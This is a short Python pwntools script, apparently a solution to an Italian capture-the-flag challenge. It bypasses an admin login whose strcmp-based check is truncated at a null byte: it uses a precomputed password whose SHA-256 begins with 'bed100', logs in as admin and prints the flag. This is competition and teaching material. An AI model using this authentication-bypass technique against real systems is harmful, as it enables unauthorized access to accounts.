from hashlib import sha256
from pwn import *
import os

# Lo strcmp sulle password confronta fino a che non trova \x00 e quindi basta che troviamo un hash corrispondente che abbia
# una struttura come \xbe\xd1\x00 ossia che inizi con "bed100"
'''
while True:
    rnd = os.urandom(8).hex().encode()
    hex_rnd = sha256(rnd).hexdigest()
    if hex_rnd[:6] == "bed100":
        passwd = rnd
        break
'''
passwd = b"e3bb80811c0fbb15"

r = remote("adminpanel.challs.olicyber.it", 12200)

r.recv(1000)
r.sendline(b"1")

r.sendlineafter(b"Username: ", b"admin")
r.sendlineafter(b"Password: ", passwd)

r.sendlineafter(b"Esci\n", b"5")
flag = r.recvline().split(b"token: ")[1].decode().strip()
print(flag)
